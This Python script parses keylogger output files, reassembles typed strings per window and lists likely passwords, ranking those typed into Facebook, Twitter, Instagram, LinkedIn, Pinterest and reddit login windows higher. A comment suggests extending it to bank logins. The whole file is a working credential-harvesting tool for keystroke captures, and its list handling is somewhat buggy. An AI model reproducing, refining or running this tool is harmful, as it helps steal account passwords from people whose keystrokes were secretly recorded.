import sys
import os.path

# A function to automatically add input strings from common log in windows
# as passwords
# Currently based on common social media websites, however it would be
# straightforward enough to add other log in websites, such as common banks
listOfLoginWindows = [
    "Log into Facebook",
    "Facebook - Log In or Sign Up",
    "Twitter. It's what's happening / Twitter",
    "Instagram",
    "LinkedIn: Log In or Sign Up",
    "Pinterest",
    "reddit.com: Log in"
    ]
def isLoginWindow(w):
    for e in listOfLoginWindows:
        if e in w:
            return True
    return False

# A way to only load specific log files
filename = "log.txt"
while True:
    filename = input("Filename: ")
    if (filename == ""):
        sys.exit(1)
        break
    if os.path.exists(filename):
        break
    else:
        print(filename + " not found!\n")

try:
    file = open(filename, "r")

except:
   print("oops!")
   sys.exit(1)    
file.readline()
file.readline()
file.readline()
file.readline()
line = file.readline()
lastMinutes = 0
lastSeconds = 0

lastWindow = ""
key = ""
currentString = ""

dictionary = {}


while(len(line) > 15):
    lineList = line.split(":")
    timestampHours = lineList[0][11:]
    timeStampMinutes = lineList[1]
    timeStampSeconds = lineList[2][:2]
    window = lineList[3][:-4]
    key = lineList[4][1:]

    timeStampSeconds = int(timeStampSeconds)
    timeStampMinutes = int(timeStampMinutes)

    currentString = currentString.strip()

    if(key.strip() == "[backspace]" and not len(currentString) == 0):
        currentString = currentString[:-1]

    elif(key.strip() == "[space]" or key.strip() == "[enter]"):
        if window in dictionary.keys():
            dictionary[window].append(currentString)
            currentString = ""
        else:
            dictionary[window] = [currentString]
            currentString = ""

    elif(key.strip() == "[tab]"):
        if window in dictionary.keys():
            array = dictionary[window]
            array.append(currentString)
            currentString = ""
        else:
            dictionary[window] = [currentString]
            currentString = ""
        

    elif(not window == lastWindow):
        print("huzzah!")
        if lastWindow in dictionary.keys():
            dictionary[lastWindow].append(currentString)
            currentString = key
        else:
            dictionary[window] = [currentString]
            currentString = key

    else:
        timeStampSeconds = int(timeStampSeconds)
        timeStampMinutes = int(timeStampMinutes)
        diffSeconds = timeStampSeconds - lastSeconds
        if(diffSeconds > 30):
            if window in dictionary.keys():
                array = dictionary[window]
                array.append(currentString)
                currentString = key
            else:
                dictionary[window] = [currentString]
                currentString = key

        elif(diffSeconds < 0):
            diffMinutes = timeStampMinutes - lastMinutes
            diffMinutes *=60
            diffSeconds = diffMinutes + diffSeconds
            if(diffSeconds > 30):
                if window in dictionary.keys():
                    array = dictionary[window]
                    array.append(currentString)
                    currentString = key
                else:
                    dictionary[window] = [currentString]
                    currentString = key

    
        elif(key.strip() != "[right_shift]" and key.strip() != "[left_shift]" and key.strip() != "[shift]"):
            currentString += key

    lastWindow = window
    lastSeconds = timeStampSeconds
    lastMinutes = timeStampMinutes
    print(key)
    line = file.readline()
        
passwordList = []

for key in dictionary.keys():

    for i in dictionary[key]:
        if(len(i) >= 8 and len(i) <= 16):
            passwordList.append(i)

    for i in passwordList:
        if not i.islower() or not i.isalpha() or isLoginWindow(key):
            passwordList.remove(i)
            passwordList.insert(0,i)

    print("The potential passwords for " + key + " are: ")

    for i in passwordList:
        print(i)

    passwordList = []
